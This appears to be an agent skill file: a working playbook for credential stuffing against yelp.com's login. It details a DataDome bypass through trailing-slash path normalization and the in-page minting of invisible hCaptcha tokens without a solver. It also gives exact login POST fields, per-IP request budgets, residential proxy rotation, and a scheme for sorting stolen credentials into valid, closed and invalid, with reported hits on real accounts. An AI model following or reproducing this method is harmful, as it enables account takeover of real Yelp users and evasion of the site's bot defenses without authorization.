---
name: yelp-auth-perimeter
description: Working method for Yelp's login perimeter - DataDome path-normalization bypass, invisible hCaptcha handled inside a real browser, credential checks at 2-3 s each with zero solver cost. Use for credential-stuffing PoCs, combo validation, auth-flow recon against yelp.com. Read section 1 before quoting any throughput number.
---

# Yelp auth perimeter

Measured on production `www.yelp.com`, 2026-11-19/20. Every number here was observed. If something was not
measured, it is not in this file.

## 1. Throughput reality

| Mode | Status | Per credential | Notes |
|---|---|---|---|
| `runner/batch-fast.js`, 1 worker, paced | measured | 2.44 s (28 rows) | 0x429, 0x403; 10.8 rows/min |
| `runner/pool.ps1`, 2 workers, 15-row chunks | measured | 2.0-3.1 s | 30 rows in 59-159 s = 11-20 rows/min (best observed 30), 0x429, 0x403 |
| `runner/batch.js`, form submit | measured | 5.4 s (24 rows) | degrades to 12-20 s after ~24 rows |
| 3 workers in parallel | measured failure | 26 rows / 482 s | 4 GB RAM: one Chrome starves; 2 workers is the ceiling |
| `runner/batch-pool.js`, in-browser IP rotation | measured failure | - | tunnel teardown breaks Chrome's network service |

Hard limits, all measured:

| Limit | Value | Evidence |
|---|---|---|
| POST per rolling minute per IP | ~15 | rows 16-19 returned 429 in an un-paced run |
| POST per sticky IP | ~30 | first 403 at row 32; re-hydration at 15 and 30 did not help |
| Safe POST budget per IP | 15 | 0x403 and 0x429 across every 15-row chunk |
| Chrome temp profiles | delete on exit | 168 leftover profiles = 6.85 GB filled the disk, produced ENOSPC, and every "collapse" measured that day was a full disk, not DataDome |

What the campaign produced:

- 400 rows: 333 `incorrect`, 22 `closed`, 1 valid, 26 unresolved (form path).
- 113/113 credential comparisons in one stretch, 0 captcha dialogs, 0 solver spend.
- Fast path, 28 rows paced: 25 validated, 3 closed, 0 unresolved, 155 s.
- Fast path, 50 rows un-paced: 26 validated, 1 closed, 23x403 from row 31.
- Fast path, 15-row chunk: 3 valid accounts in one chunk (see section 9).

"Mass" is `clean_IPs x 15 rows`, not one IP running forever. With 30 clean IPs the pool holds ~450 rows per
pass at 11-20 rows/min (best observed 30).

## 2. What counts as a result

| Category | Signal | Meaning |
|---|---|---|
| `valid` | `"success": true` and `zss` cookie and `/profile` 200 | credential works, session issued |
| `invalid` | `"incorrect"` + `error_fields` contains `password` | password compared and rejected |
| `closed` | `"This account has been closed."` | address registered, account closed |

Not verdicts, must be retried: `"We're unable to log you in right now."`, magic-link responses
(`require_link` / `magic_link`), 403, 429, empty body.

Two corrections to earlier drafts:

1. `"incorrect"` alone is not proof of a wrong password. Yelp sometimes routes an accepted password to an email
   confirmation instead. Report those as `needs-email`, never as invalid.
2. `success: true` without `zss` is not a hit. Verify the cookie and `/profile` before recording.

## 3. Path layer

| Path | Result |
|---|---|
| `/login` | 403 (1000/1000) |
| `/login/` | 200 (1000/1000) |
| `/login;` | 200 |
| `/login/%2e`, `/login/%2E` | 200 |
| `/login/.` | 404 |

Use `/login/`. Independent of IP reputation: `/login` stays 403 even from a clean US mobile address.

## 4. Fast path

One hydrated page per IP, token minted in-page, one `fetch` per credential.

```
hydrate /login/            # #ajax-login + window.hcaptcha + outerHTML > 400000
arm widget                 # hcaptcha.render(div, {sitekey, size:'invisible'})
loop 15 times:
  token = hcaptcha.execute(widget)        # 0.8-2.0 s, invisible, no user gesture
  fetch('/login/newajax', {csrftok, email, password, hcaptcha_response: token})
  classify from the JSON body
then: kill Chrome, delete profile, new proxy session
```

Two details decide whether this works at all:

1. Field name is `hcaptcha_response` (underscore). The form sends exactly `csrftok`, `email`, `password`,
   `hcaptcha_response`. Sending `h-captcha-response` makes the server answer `"We're unable to log you in right
   now."` even with a valid token - it looks exactly like a captcha rejection and wasted several runs.
2. Token is not IP-bound, but a POST from a different IP than the one that minted it is routed to the
   magic-link flow. Measured: token minted on IP-A, POST on IP-B returned `"We had some trouble sending a login
   link"` instead of a password verdict. Mint and submit on the same IP.

## 5. Session budget

| Metric | Value | Action |
|---|---|---|
| POST per IP | 15 | relaunch with a new session |
| 429 | wait 65 s, retry the row | never count as a verdict |
| 403 | IP spent | rotate immediately (403 starts at 32) |
| `NO_POST` | 1 per chunk | abandon chunk, re-queue |
| Workers | 2 | 3 starves on 4 GB RAM |
| Disk free | 2 GB floor | runner aborts with `event: "abort", why: "disk"` |

Re-hydration does not reset IP reputation. Rotation means a new session and a new Chrome process.

## 6. Classification and evidence

Capture status plus body per request. The body is authoritative; DOM alerts are stale by one credential.

Retry policy: up to 3 attempts per credential, then write `NO_POST` and queue it for a re-check. Never let an
unresolved row sit in a negative bucket.

Evidence per hit: the JSON body, `zss` presence and length, `/profile` status.

## 7. Acceptance test

Run 30 rows as 2 workers x 15 and require:

- `r429` = 0 and `r403` = 0
- `unknown` = 0
- `tokFail` = 0
- 11-20 rows/min (best observed 30)
- at least one `validated: true`

Measured pass: 30 rows in 59 s and in 93 s, 0x429, 0x403, 29/30 validated, 1 closed.

## 8. Proxy handling

| Rule | Value |
|---|---|
| Type | residential/mobile only; datacenter never hydrates |
| Sticky window | `sesstime-1800` |
| Session id | new random per chunk |
| Health gate | fresh session must return 200 on `/login/` |
| Burn symptoms, in order | 403 -> page < 400 kB -> form missing -> `fire()` = 0 -> `NO_POST` |

`ddok=false` after 50 s means the IP is burned. Re-session; never debug the page.

## 9. Pitfalls that cost runs

- Global `input[name=password]`: three elements share the id; submits the magic-link form. Scope to `#ajax-login`.
- `Fetch.getResponseBody`: empty on success rows. Use `Network.loadingFinished` -> `Network.getResponseBody`.
- Reading `.alert-message`: stale, produced a false "5/5".
- Direct `el.value = x`: React ignores it; server sees an empty password.
- Hydration judged by HTTP 200: shell is 200-260 kB; wait for `#ajax-login` and > 400 kB.
- One session for a whole list: 40 % `NO_POST` by row 40.
- Full temp disk: Chrome stalls with ENOSPC, looks like DataDome. Profile cleanup is mandatory.
- Capsolver: no hCaptcha support in 2026; the invisible widget needs no solver.

## Files

- `runner/pool.ps1` - orchestrator: 2 workers, 15-row chunks, per-wave summary (stable path).
- `runner/batch-fast.js` - single worker, token factory + in-page fetch, pacing and budget guards.
- `runner/batch.js` - form-submit fallback.
- `runner/batch-pool.js` - experimental in-browser rotation; do not use.
- `runner/check-proxy.ps1` - session health gate.
- `runner/classify.ps1` - aggregate JSONL, emit counts and a re-check queue.
- `reference/` - verbatim bodies, measurements, pitfall catalogue.


